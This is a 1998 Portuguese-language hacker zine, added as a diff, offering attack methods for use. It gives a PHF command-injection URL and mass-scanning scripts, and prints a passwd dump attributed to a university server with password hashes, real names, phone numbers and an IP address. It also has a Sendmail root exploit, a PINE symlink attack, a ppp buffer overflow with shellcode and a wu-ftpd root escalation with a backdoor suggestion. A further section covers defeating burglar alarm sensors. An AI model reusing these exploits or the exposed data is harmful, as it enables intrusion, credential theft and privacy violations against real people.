@@ -1,0 +1,2362 @@
+             T H E
+        
+       $$P°"²$b   ,gP°"²$b   ,gP°""²$b  ,gP°$$$$$$$$²$b  ,g°   ²$b
+       $$     $$  $$     $$  $$     $$       $$$$$$      $$     $$
+       $$     $$  $$     "²  $$     $$        $$$$       $$     $$
+       $$     $$  $$P²"  ,p  $$,   ,$$        `$$'       $$,   ,$$
+       $$     $$  gg     $$  $$$$$$$$$         $$        $$$$$$$$$
+       $$     $$  $$     $$  $$'   `$$         $$        $$'   `$$
+       $$     $$  $$     $$  $$     $$         $$        $$     $$
+       $$     $$  $$     $$  $$     $$        .$$.       $$     $$
+       T$,   gP'  T$,   gP'  $$     $$        $$$$       $$     $$
+       $$P²²°"    $$P²²°"    "²     ²"        $$$$       "²     ²"
+                  ²"      <Cacaio>
+                                     K N i G H T S
+
+ ___________________________________TDK______________________________________
+ ----------------------------------------------------------------------------
+
+                        Data estelar:  1.0874624701
+                        Data terrestre:  17/06/1998
+                        Tamanho exato: 94.320Kbytes
+
+
+TDK #03a
+
+e-mail: tdk@DeathKnights.com
+
+page: http://www.DeathKnights.com
+
+
+     melhor visualizado com joe -asis e terminal com setfont alt-8x16. (linux)
+                           melhor visualizado com edit.                (dos)
+
+
+ ___________________________________TDK______________________________________
+ ----------------------------------------------------------------------------
+
+
+.-----------.
+|   SECOES   \_______________________________________________________________
+`----------------------------------------------------------------------------'
+
+1  * ESCLARECiMENTOS                     Cacaio
+2  * COMO HACKEAR WEBPAGES               Cacaio
+3  * ViOLANDO ALARMES                    REBOOT
+4  * wu-ftpd 2.4                         Cacaio
+5  * Especial ICQ!                       Cacaio
+6  * PHREAKING parte 2                   Cacaio
+7  * INVASAO POR iP                      ReNeGaDe
+8  * Tutorial de asm!                    Hunter^Heads
+9  * BONUS                               Cacaio
+--
+
+10 * FEW WORDS                           Cacaio
+
+
+-=[  1  ]=-
+.----------------.
+| ESCLARECiMENTOS \__________________________________________________________
+`----------------------------------------------------------------------------'
+
+
+        Nao nos responsabilizamos pela informacao contida neste zine. Se voce
+usar indevidamente qualquer informacao contida aqui, a responsabilidade e' to-
+da sua.
+
+        Voce pergunta: por que alguns membros escreveram no ultimo zine e nada
+neste? Por que ninguem e' TAO atoa como os que escrevem em todos os numeros
+que podem ficar escrevendo materias direto(meu caso). Se voce gostou da ma-
+teria de algum membro e quer ver mais materias do mesmo, mande-nos um e-mail.
+Quem escreveu uma materia nao e' obrigado a escrever outras(se for isso o que
+voce quer), mas possivelmente ainda escrevera'.
+
+        Neste numero foi usado um trecho traduzido de outro zine, mas para
+somente para complementar a materia(de Webpages).
+        Para a secao Especial ICQ! foi usado tambem a explicacao e um pro-
+graminha(o ipmask sendo usado com icq) de outro zine muito bom (o NearZ).
+Greetings pro pessoal de la'!
+
+        O(s) provedor(es) citado(s) neste zine(provedores, nao universidades
+ou coisas do genero) foram contactados antes do lancamento do zine para que
+pudessem se proteger de possiveis ataques de leitores do zine, o que nao e
+nosso intuito a citar os provedores, mas o intuito e' somente de exemplificar
+e mostrar como o problema e' ou pode ser maior do que se pensa.
+
+        Este grupo nao visa nenhum fim lucrativo. Nos fazemos isto por diver-
+sao e nada mais.
+
+        Se voce nao gostou da informacao contida aqui, nao nos perturbe. O
+problema e' todo seu.
+
+
+-=[  2  ]=-
+.----------------------.
+| COMO HACKEAR WEBPAGES \____________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+
+
+Esta materia tem somente bugs que sao antigos, mas muuuiiitos provedores/ser 
+vidores ainda estao desprotegidos, ate a Unicamp esta desprotegida quanto a
+um dos metodos para ter ideia! Vamos aos metodos que e' o que interessa!
+
+      .-----------------------------------.  
+      | Pegando o arquivo passwd via FTP   `---------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+
+Este e' um dos metodos mais faceis de se pegar o arquivo passwd, mas a grande
+maioria das maquinas ja esta deixando o passwd em shadow. Uma outra grande zi- 
+ne (a Axur05) ja falou como pegar o arquivo passwd por este metodo, mas pra
+quem nao leu ou se esqueceu como se faz(esquecer e' bem dificil e lamer,
+hein!) , vamos falar aqui como e'.
+
+Voce entra por FTP anonimo na maquina em que voce quer pegar o passwd, entra
+no diretorio /etc (cd /etc) e pega o arquivo passwd (get passwd). Bem facil,
+mas poucas vezes se obtem sucesso.
+
+Observe um arquivo passwd:
+
+root:9IKVw3Pp.jAJw:0:1:Operator:/:/bin/csh
+cris:u5GpJWccDjAf2:1113:20:Cristina Voltas Martinez Carrera:/usr/people/cris:/bin/csh
+ebtrj:k9jRxMs4Wdp.o:2077:2077:Embratel Rio grupo Servico de Comunicacao de Mensagens:/usr/ebtrj:/bin/csh
+Cacaio:./666\(4(410:1114:100:Cacaio Torquato:/usr/people/Cacaio:/bin/csh
+
+Se o passwd o qual voce pegou estiver como na forma acima, ele nao esta' em
+shadow, logo e' so voce rodar o seu cracker de preferencia e pegar as senhas.
+
+Observe agora outro passwd:
+
+root:x:0:1:Superuser:/:
+ftp:x:202:102:Anonymous ftp:/u1/ftp:
+ftpadmin:x:203:102:ftp Administrator:/u1/ftp
+
+E mais outro:
+
+root:x:0:1:0000-Admin(0000):/:/usr/bin/csh
+daemon:x:1:1:0000-Admin(0000):/:
+bin:x:2:2:0000-Admin(0000):/usr/bin:
+sys:x:3:3:0000-Admin(0000):/:
+adm:x:4:4:0000-Admin(0000):/var/adm:
+lp:x:71:8:0000-lp(0000):/usr/spool/lp:
+smtp:x:0:0:mail daemon user:/:
+uucp:x:5:5:0000-uucp(0000):/usr/lib/uucp:
+nuucp:x:9:9:0000-uucp(0000):/var/spool/uucppublic:/usr/lib/uucp/uucico
+listen:x:37:4:Network Admin:/usr/net/nls:
+nobody:x:60001:60001:uid no body:/:
+noaccess:x:60002:60002:uid no access:/:
+webmastr:x:53:53:WWW Admin:/export/home/webmastr:/usr/bin/csh
+ftp:x:54:54:Anonymous FTP:/export/home/anon_ftp:/bin/false
+ecsl:x:1547:1547:Embrapa - Centro de Soja de Londrina:/dka200/users/ecsl/bin/csh
+scfbes:x:2071:2071:Secretaria da Crianca Familia Bem Estar Social:/dka20/users/scfbes:/bin/csh
+scfbes01:x:2072:2072:Secretaria da Crianca Familia Bem Estar Social:/dka00/users/scfbes01:/bin/csh
+scfbes02:x:2073:2073:Secretaria da Crianca Familia Bem Estar Social:/dka00/users/scfbes02:/bin/csh
+scfbes03:x:2074:2074:Secretaria da Crianca Familia Bem Estar Social:/dka00/users/scfbes03:/bin/csh
+mack:x:2075:2075:Universidade Mackenzie:/dka200/users/mack:/bin/csh
+unimep:x:2076:2076:Universidade Metodista de Piracicaba:/dka200/users/unmep:/bin/csh
+
+
+Estes arquvos passwd estao em shadow, logo tem um "x" no lugar da senha, e
+algumas vezes ou um "*" no lugar da senha.
+
+Agora que voce sabe distinguir um arquivo passwd encriptado de um nao encrip-
+tado, e' so desencriptar e fazer a festa.
+
+
+      .----------------.  
+      | TECNICA DO PHF  `---------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+Esta tecnica e' o modo mais facil de pegar o arquivo passwd. Embora nao fun-
+cione em 96% das vezes, e' o metodo mais rapido. Tudo o que precisa para usar 
+este metodo e' um browser! Basta abrir seu browser com a seguinte URL:
+
+http://Site_aqui!/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
+
+Voce tem que substituir Site_aqui! pelo endereco do site que voce quer pegar
+o passwd. Se voce quiser pegar em www.teste.com, use o seguinte:
+
+http://www.teste.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+E e' so' isso! Agora sente-se e copie os passwd's (se funcionar).
+
+Eu usei o exploit do PHF na Unicamp e olha o que que deu!
+
+                                 Query Results
+
+root:aCCa8dYQJWVqQ:0:0:Super-User,,,,,,,:/:/bin/ksh
+sysadm:*:0:0:System V Administration:/usr/admin:/bin/sh
+decnet:DECNET:998:998:DECnet guest acct,,,,,,,:/usr/tmp:/bin/login
+diag:*:0:996:Hardware Diagnostics:/usr/diags:/bin/csh
+daemon:*:1:1:daemons:/:/dev/null
+bin:*:2:2:System Tools Owner:/bin:/dev/null
+uucp:*:3:5:UUCP Owner:/usr/lib/uucp:/bin/csh
+sys:*:4:0:System Activity Owner:/usr/adm:/bin/sh
+adm:*:5:3:Accounting Files Owner:/usr/adm:/bin/sh
+www:eI7hZr1cQFTwQ:6:0:www server owner:/usr/www:/bin/csh
+lp::9:9:Print Spooler Owner,,,,,,,:/usr/spool/lp:/bin/sh
+nuucp::10:10:Remote UUCP User,,,,,,,:/usr/spool/uucppublic:/usr/lib/uucp/uucic
+demos:.uJWN.YFa.m22:993:997:Demonstration User,,,,,,,:/usr/demos:/bin/csh
+tutor::994:997:Tutorial User,,,,,,,:/usr/tutor:/bin/csh
+tour:okXFsOLp/8rkI:995:997:IRIS Space Tour,,,,,,,:/usr/people_original/tour:/b
+n/csh
+guest::998:998:Guest Account,,,,,,,:/usr/people/guest:/bin/csh
+4Dgifts::999:998:4Dgifts Account,,,,,,,:/usr/people/4Dgifts:/bin/csh
+nobody:*:-2:-2::/dev/null:/dev/null
+software:.XGHdpwNnItGQ:110:20:Software configuration manager,,,,,,,:/usr3/peop
+e/software:/bin/csh
+mdata:ti0o2Ep43W0s2:132:20:METPRO data manager,,,,,,,:/usr3/people/mdata:/bin/
+sh
+kermit:E2RAqW.A2N0Hc:1126:20:kermit,,,,,,,:/usr3/people/kermit:/bin/csh
+paulotak:QaIjH7AsNSCc.:1111:20:Paulo Takeshi Matsuo,,818-4808,,,,,:/usr3/peopl
+/paulotak:/bin/csh
+hallak:zA/1hHxAsI7EA:1112:20:Ricardo Hallak,,,,,,,:/usr3/people/hallak:/bin/cs
+claire:eI7hZr1cQFTwQ:1114:6:CLAIRE,,,,,,,:/usr/claire:/bin/csh
+pldsdias:WOuljdZ/OquT.:1117:20:Pedro Leite da Silva Dias,Room 348,818-4732,,,,
+DCA/IAG/USP:/usr3/people/pldsdias:/bin/csh
+oacevedo:msegr.s.0GwKU:1119:20:Otavio Costa Acevedo,r do matao\, 1226,818-4808
+,,,,Lab. Sinotica-DCA-IAG-USP:/usr3/people/oacevedo:/bin/csh
+ftp:*:997:995:FTP anonymous account:/usr/local/ftp:/dev/null
+goes:mm0Zpc.Of2C42:1122:20:Goes-8 Data Files,,,,,,,:/usr3/people/goes:/bin/csh
+marciosm:FK0UdfsDPikDM:1123:20:Marcio Saul Mello,,818-4808,,,,,Lab.Sinotica/DC
+:/usr3/people/marciosm:/bin/csh
+mmgcosta:*Yf1/oFCDK0LwY:1124:20:Marcia Maria Gomes Costa,dca-iag-usp,818-4808,
+,,,lab.sinotica:/usr3/people/mmgcosta:/bin/csh
+ricnog:*r356Tz3A0Na56:1125:20:Ricardo Chabarria Nogueira,dca-iag-usp,818-4808,
+,,,lab.sinotica:/usr3/people/ricnog:/bin/csh
+mcpresti:*1VlnHqIO1Oel2:1127:20:Marcelo Cavedon Presti,dca-iag-usp,818-4808,,,
+,lab.sinotica:/usr3/people/mcpresti:/bin/csh
+caarem:Ym041q2m8kOj.:1128:20:Caarem Studzinski,dca-iag-usp,818-4808,,,,,lab.si
+otica:/usr3/people/caarem:/bin/csh
+msanches:WcSQSsKLE2CZA:1130:20:Marcos Barbosa Sanches,dca-iag-usp,818-4808,,,,
+lab.Sinotica:/usr3/people/msanches:/bin/csh
+fita:5BOrozc4Ait2I:1000:20:fita,,,,,,,:/usr3/people/fita:/bin/csh
+gerop:GNDOZbhUMaN7k:1002:20:gerencia de operacao,dca-iag-usp,818-4808,,,,,lab.
+inotica:/usr3/people/gerop:/bin/csh
+mpcorrea:pw5VdSHMIEZLs:1132:20:Marcelo de Paula Correa,dca-iag-usp,818-4808,,,
+,lab. Sinotica:/usr3/people/mpcorrea:/bin/csh
+fhdsales:70s5hTVZFhLZM:1133:20:Fernando Henrique de Sales,dca-iag-usp,818-4808
+818-4770,,,,,lab.sinotica:/usr3/people/fhdsales:/bin/csh
+alepezza:Bbxdy.TqKIEds:1134:20:Alexandre Bernardes Pezza,dca-iag-usp,818-4808,
+,,,lab.sinotica:/usr3/people/alepezza:/bin/csh
+apereira:7LVRgDT5kiesU:1136:20:Augusto Jose Pereira Filho,cth,211-1933r237,,,,
+cth-usp:/usr3/people/apereira:/bin/csh
+allan:dEy/bvOiixF0c:1116:20:allan rodrigo de lima da silva,r do matao 1226,818
+4808,,,,,lab.sinotica:/usr3/people/allan:/bin/csh
+lpaulino:d.ZV5F6tX24Wo:1138:20:Luis Eduardo Bondesan Paulino:/usr3/people/lpau
+ino:/bin/csh
+yann:RtvRKVYKGOZYc:260:20:H. S. Yann:/usr3/people/yann:/bin/ksh
+ricamarg:d8TISr2tNQr4E:1143:20:Ricardo Camargo:/usr3/people/ricamarg:/bin/csh
+andreiat:vhnYxQBkEGG.E:1144:20:Anderia:/usr3/people/andreiat:/bin/csh
+elicia:9sIdW5Hhq1FpA:1145:20:Elicia Eri Inazawa:/usr3/people/elicia:/bin/csh
+phf
+
+Se alguem quiser saber o endereco da maquina pra 'dar uma olhada', ai' vai:
+143.107.14.157
+
+
+Se voce quiser um metodo mais rapido pra pegar os passwd's com o metodo do PHF,
+ai vao tres scripts que com certeza te ajudarao! Na page do tdk em breve tera
+um programa que estou fazendo que resume estes tres scripts em um so, e tambem
+tem outras utilidades relacionadas a cgi.
+
+travel.sh
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+#!/bin/sh
+
+if [ $# -ne 1 ]
+then
+  echo "Usage: $0 <web site to begin with>"
+  exit 1
+fi
+
+lynx -traversal -crawl http://$1
+
+echo ; echo 
+
+rm -rf lnk*
+rm -rf travers*
+./grab.sh reject.dat list
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+
+
+grab.sh
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+#!/bin/sh
+
+if [ $# -ne 2 ]
+then
+  echo "Usage: $0 <rawlist> <output file>"
+  exit 1
+fi
+
+for site in `cat $1 | grep http | grep -v ">" | grep -v "<"`
+do
+  echo $site | cut -d"/" -f3 >> $2.temp
+done
+
+for check in `cat $2.temp`
+do
+  if [ "$check" != "" ]
+  then
+    echo $check >> $2.tmp
+  fi
+done
+
+cat $2.tmp | grep -v mil | grep -v gov > $2.temp 
+
+sort -fd $2.temp | uniq >> $2
+
+rm $2.temp $2.tmp
+
+echo ; 
+echo 
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+
+
+phf.sh
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+#!/bin/sh
+
+if [ $# -ne 1 ]
+then
+  echo "Usage: $0 <list>"
+  exit 1
+fi
+
+phf="/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd"
+
+for target in `cat $1`
+do
+  echo Checking $target ...
+  lynx -dump http://$target$phf > $target.temp
+
+  if cat $target.temp | grep root:
+  then
+    echo The Death Knights group got possible passwd file from $target !
+    echo Greetings to CVC group!
+    mv $target.temp $target.pwd
+    echo phf >> $target.pwd
+  else
+     rm $target.temp
+   fi
+done
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+
+      .---------.  
+      | EXPLOITS `----------------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+Exploits sao mais complexos do que pegar o passwd por ftp ou pelo phf, mas sao 
+muito mais eficientes.
+
+Para tentar um exploit, e' melhor ter uma conta no seu alvo(se possivel). Aqui
+irao alguns poucos exploits pra voce se divertir!
+
+Sendmail v.8.8.4!
+
+Este exploit cria um programa suid /tmp/x que te da acesso de root na shell.
+Aqui o source para ficar mais facil:
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+cat << _EOF_ >/tmp/x.c
+ #define RUN "/bin/ksh"
+ #include<stdio.h>
+ main()
+ {
+    execl(RUN,RUN,NULL);
+ }
+_EOF_
+#
+cat << _EOF_ >/tmp/spawnfish.c
+ main()
+ {
+   execl("/usr/lib/sendmail","/tmp/smtpd",0);      
+ }                                             
+_EOF_
+#
+cat << _EOF_ >/tmp/smtpd.c
+ main()
+ {
+   setuid(0); setgid(0); 
+   system("chown root /tmp/x ;chmod 4755 /tmp/x");
+ }
+_EOF_
+#
+#
+gcc -O  -o /tmp/x /tmp/x.c
+gcc -O3 -o /tmp/spawnfish /tmp/spawnfish.c
+gcc -O3 -o /tmp/smtpd /tmp/smtpd.c
+#
+/tmp/spawnfish
+kill -HUP `/usr/ucb/ps -ax|grep /tmp/smtpd|grep -v grep|sed s/"[ ]*"// |cut -d" " -f1`
+rm /tmp/spawnfish.c /tmp/spawnfish /tmp/smtpd.c /tmp/smtpd /tmp/x.c
+sleep 5
+if [ -u /tmp/x ] ; then
+   echo "leet..."
+   /tmp/x
+fi 
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+
+Agora outro exploit. Vou mostrar agora o exploit do pine no linux.
+Observando os processos com 'ps' pra ver quais usuarios estao usando o PINE,
+um pode entao dar um ls no /tmp pra apanhar os lockfiles de cada usuario.
+Observando os processos novamente ira agora revelar quando cada usuario sai do
+PINE ou sai das mensagens nao lidas na INBOX, efetivamente apagando o respec-
+tivo lockfile.
+
+Criando um link simbolico de /tmp/.harmors_lockfile para ~harmors.rhosts ira
+fazer com que o PINE  crie ~hamors/.rhosts  como um arquivo com o mesmo pro-
+cesso e identificacao do pine. Agora basta simplesmente fazer um
+echo "+ +" > /tmp/.hamors_lockfile e entao um rm /tmp/.hamors_lockfile.
+
+O seguinte exemplo foi escrito por Sean B. Hamor. Neste exemplo hamors e' a
+vitima e catluvr e' quem ataca:
+
+hamors (21 19:04) litterbox:~> pine
+
+catluvr (6 19:06) litterbox:~> ps -aux | grep pine
+catluvr   1739  0.0  1.8  100  356 pp3 S    19:07   0:00 grep pine
+hamors    1732  0.8  5.7  249 1104 pp2 S    19:05   0:00 pine
+
+catluvr (7 19:07) litterbox:~> ls -al /tmp/ | grep hamors
+- -rw-rw-rw-   1 hamors   elite           4 Aug 26 19:05 .302.f5a4
+
+catluvr (8 19:07) litterbox:~> ps -aux | grep pine
+catluvr   1744  0.0  1.8  100  356 pp3 S    19:08   0:00 grep pine
+
+catluvr (9 19:09) litterbox:~> ln -s /home/hamors/.rhosts /tmp/.302.f5a4
+
+hamors (23 19:09) litterbox:~> pine
+
+catluvr (11 19:10) litterbox:~> ps -aux | grep pine
+catluvr   1759  0.0  1.8  100  356 pp3 S    19:11   0:00 grep pine
+hamors    1756  2.7  5.1  226  992 pp2 S    19:10   0:00 pine
+
+catluvr (12 19:11) litterbox:~> echo "+ +" > /tmp/.302.f5a4
+
+catluvr (13 19:12) litterbox:~> cat /tmp/.302.f5a4
++ +
+
+catluvr (14 19:12) litterbox:~> rm /tmp/.302.f5a4
+
+catluvr (15 19:14) litterbox:~> rlogin litterbox.org -l hamors
+
+Agora o ultimo e melhor exploit que irei mostrar.
+Um script para exploracao da vulnerabilidade do ppp. Funciona perfeitamente
+no FreeBSD. Mexa nos numeros se nao funcionar. Aqui vai:
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define BUFFER_SIZE     156     
+
+#define OFFSET          -290    
+
+long get_esp(void) { __asm__("movl %esp,%eax\n"); }
+
+main(int argc, char *argv[])
+{
+        char *buf = NULL;
+        unsigned long *addr_ptr = NULL;
+        char *ptr = NULL;
+        char execshell[] =
+        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f" 
+        "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52" 
+        "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"  
+        "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";    
+   
+        int i,j;
+
+        buf = malloc(4096);
+
+        i = BUFFER_SIZE-strlen(execshell);
+
+        memset(buf, 0x90, i);
+        ptr = buf + i;
+
+        for(i = 0; i < strlen(execshell); i++) 
+                *ptr++ = execshell[i];
+
+        addr_ptr = (long *)ptr;
+        for(i=0;i < (104/4); i++)
+                *addr_ptr++ = get_esp() + OFFSET;
+
+        ptr = (char *)addr_ptr;
+        *ptr = 0;
+
+        setenv("HOME", buf, 1);
+
+        execl("/usr/sbin/ppp", "ppp", NULL);
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+Agora que voce ja tem acesso root, qual o proximo passo? Modificar a pagina e 
+se divertir!
+
+                         Cacaio@DeathKnights.com
+
+-=[  3  ]=-
+.-----------------.
+| ViOLANDO ALARMES \_________________________________________________________
+`----------------------------------------------------------------------------'
+                                by REBOOT
+
+y0 aLL
+Ae filhotes, eh a minha primeira participacao na zine, e vou mostrar
+a vcs um pouco sobre violacao de alarmes residenciais ih automobilisticos, ae
+vai, aguenta ae.
+
+      .------------.  
+      | iNTRODUCAO  `-------------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Todo  sistema  de alarme necessita de uma central de processamento de sinais,
+um sistema de aviso para fazer algum tipo de operacao qd a area eh violado ih
+alguns sensores para fazer a integracao da area violada com a central de pro-
+cessamento. Componentes basicos para um sistema convencional de alarmes:
+
+
+SENSORES      CIRCUITO         CENTRAL        FONTE / BATERIA     SISTEMA
+             DE DESARME      DE CONTROLE      CARREGADOR, ETC     DE AVISO
+
+
+      .---------------------.
+      | SENSORES MAGNETICOS  `----------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+Os sensores magneticos consistem  num interruptor de laminas e um ima, monta-
+dos em pecas separadas. Muito usados em portas e/ou janelas. Numa instalacao,
+o interruptor(red-switch) eh q tem ligacao eletrica com  o sistema de  alarme
+atraves  de fios, e  eh  posicionado na  parte fixa do objeto ih o ima eh fi-
+xado na parte movel do objeto.
+
+Quando o objeto estah fechado o ima mantem as laminas do interruptor da parte
+fixa escostadas uma na outra de modo que o alarme fique desarmado.
+
+Se o ima for  afastado  do  interruptor de  laminas, qd a janela ou porta for
+aberta, as laminas do interruptor abrem disparando o circuito.
+
+Entao vem aquela pergunta: Como Violar ?
+
+Aguenta q aki vai filhote.
+
+No estado normal do objeto(fechado), as  laminas do  interruptor sao mantidas
+encostadas pelo ima(fixado na parte movel do objeto) do sistema. Qualquer ima
+(beim potente) externo mantera os contatos fechados, mesmo que o ima original
+seja removido(abrindo o objeto). Assim o  intruso tera  q localizar a posicao
+do sensor  antes de tentar uma  invacao ih assim  podera neutralizar. Olhando
+pelo lado de fora  de uma janela  ele podera localizar  o sensor ih terah que
+manter o seu ima nas proximidades. O alarme nao ira disparar mesmo q o ima da
+janela seja afastado.
+
+Um outro esquema parecido com esse eh o sistema de alarme para carro(aquele q
+usa um chaveirinho para  ativar/desativar). Neste  caso o  sensor eh acionado
+pelo ima carregado num chaveiro de modo a armar  e desarmar o alarme. Dae nao
+eh mais necessario eu falar oq vc teim q fazer neh filhote.
+
+
+      .------------------.  
+      | SENSORES OPTICOS  `-------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+O alarme de interrupcao eh o tipo mais comum de alarmes q fax uso de sensores
+opticos. Este alarme eh  formado por uma  fonte de luz ih um sensor que devem
+ser posicionados  de tal forma que  alguem que penetre no local protegido in-
+terrompa o feixe de luz.
+
+Bom dependendo  do tipo  da fonte  de luz  o sistema  podera  ser violado (ou
+melhor, podera  ser  enganado). Com a  descoberta do sensor(emissor de luz) o
+intruso podera inibir o sistema simplesmente focalizando uma lanterna.
+
+Mas essa forma  de enganar  o alarme somente  se aplica  aos emissores de luz
+branca, pois o tipo de luz (luz reta) que  eh emitido  pela lanterna eh igual
+ao do emissor de luz do sistema.
+
+Ateh a proxima filhotes.
+
+By REBOOT
+
+
+-=[  4  ]=-
+.--------------.
+|  wu-ftpd 2.4  \____________________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+        Existe um problema em certas configuracoes do wu-ftpd de liberam
+acesso root para qualquer usuario que esteja no sistema. As vezes tambem
+e' possivel como anonymous.
+        Na configuracao original, o wu-ftpd nao era vulneravel, mas quase
+todas as distribuicoes do Linux (ate o fim de 97)vem com o wu-ftpd compilado
+com o problema. Agora, a vulnerabilidade e' distribuida e executada como se
+fosse padrao. Algumas maquinas NAO-Linux que usam o wu-ftpd tambem devem ser
+checadas para ver se tambem nao e' vulneravel.
+Acha que e' pouca gente que e' vulneravel? Vai veri que voce tambem e'. TODAS
+as versoes do Linux Slackware ate' a 3.3 vem com os arquivos binarios pre
+compilados com a vulnerabilidade. Red Hat, Debian e outras distribuicoes nao
+tive a oportunidade de checar.
+
+      .----------------.  
+      | O que erraram?  `---------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+A variavel _PATH_EXECPATH foi setada para "/bin" no arquivo de configuracao 
+src/pathnames.h quando a distribuicao binaria foi construida.
+O _PATH_EXECPATH deveria estar setado para "/bin/ftp-exec" ou outro diretorio
+que nao contem shell ou interpretador de comando.
+
+      .------------------.  
+      | Coisa de maluco!  `--------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+O source que vem com o Linux bugado ja esta setado para o valor correto
+("/bin/ftp-exec", o que deve ser checado antes de recompilar), e mesmo assim
+o binario nao. Alguem pode me explicar por que?
+Acho que ninguem explica.
+
+      .-------------.  
+      | Testando...  `--------=----------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+Pra ver se o seu sistema esta vulneravel, voce pode executar os seguintes
+comandos:
+
+srchost> ftp ftphostbugado
+Connected to ftphostbugado
+220 ftphostbugado FTP server (Version wu-2.4(2) Mon Apr 18 09:12:35 GMT+1000 1994) ready.
+Name (srchost:user):
+331 Password required for user.
+Password:
+230 User user logged in.
+ftp> quote site exec echo problem
+200-echo problem
+200-problem
+200  (end of 'echo problem')
+ftp> quit
+221 Goodbye.
+
+Se voce receber a linha "200-problem", seu sistema e' vulneravel. Isto pode
+ser feito como qualquer usuario, ate anonymous.
+
+      .--------------.  
+      | Pegando root  `-----------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Para pegar root se precisa de algumas coisas:
+
+    1) O local deve ter o tar no diretorio /bin.
+    2) Deve haver um diretorio com permissao para gravar para voce fazer o
+       upload do arquivo.
+    3) O site nao pode ter o chmod desabilitado.
+
+Voce pergunta, e as permissoes no /bin? Voce tera, quando voce esta como
+anonymous no ftp voce usa uid/gid 0!  (ohh..)
+
+Vamos ao que interessa, o que voce precisa fazer e' compilar um pequeno
+programa que faz o seteuid(0), chama chmod(0755, "/bin/ftp-exec") e copia
+os arquivos de saida para stdout. Voce faz o upload dele para o /incoming
+e um arquivo tareado com suas ferramentas preferidas (exemplo: um xterm
+linkado estaticamente e bash), use chmod no programa pra 0755 com 'site chmod'
+, e va para /bin/ftp-exec e chame o tar com as seguintes opcoes:
+
+site exec tar --use-compress-program /incoming/tdk -xf /incoming/tdk.tar
+
+Entao, este processo vai descomprimir todas suas ferramentas para 
+/bin/ftp-exec. O que voce tem que fazer entao e' executar xterm para ter
+acesso shell e 'driblar as mandingas' do root. Voce aceita sugestao? Que tal
+um programa que cria uma backdoor em uma porta qualquer e joga pra bash? Se
+nao aceita to nem ai', foda-se, ta lendo isso aqui por que quer!
+
+      .--------------------------.  
+      | Como arrumar o problema?  `------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+Pegue o binario com o problema corrigido em:
+
+        ftp://linux.nrao.edu/pub/people/alex/wu-ftpd-2.4-fix/
+
+ou se voce usa Slackware 3.3 ou mais novo, basta recompilar seu wu-ftpd.
+
+      .-------------.  
+      | Tristeza...  `--------=----------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+        Olha que coisa triste... mais de 20% das maquinas Brasileiras que
+usam o wu-ftpd wu-ftpd 2.4 sao vulneraveis.(ate o presente momento,
+26/05/1998) Nestes 20% estao maquinas do governo, grandes provedores como a
+openline(a qual notifiquei pois tenho amigos) por exemplo, e ate maquinas de
+simples usuarios. Sera que o pessoal nao se ligou que ja saiu versao nova a um
+tempao? Download & install. Vamos mudar esta situacao! Vamos levantar a moral
+do BRASIL! Se voce ta pouco se fudendo pro Brasil, se mata ou muda de pais,
+por que o TDK esta cansado de hipocritas como voce, otario.
+
+
+                         Cacaio@DeathKnights.com
+
+-=[  5  ]=-
+.---------------.
+|  Especial ICQ  \___________________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+        Voce usa icq e nao sabe como esconder o IP do info do icq? Bem, eh
+mails facil do que voce imagina, tendo em vista de que aquela opcao do icq98
+nao funciona.
+
+Basta digitar:
+
+	IPMASK 127.0.0.1 127.0.0.1
+
+        Dificil, neh? Seu pi no icq vai ficar como 127.0.0.1, que e' a sua
+maquina(oooohhhh) independente do seu ip. Se o cara pegar seu ip pra nukes,
+icq hijaak ou sei la o que, ele vai derrubar a ele mesmo.
+
+        Aih vai o ipmask pra vc fiote...
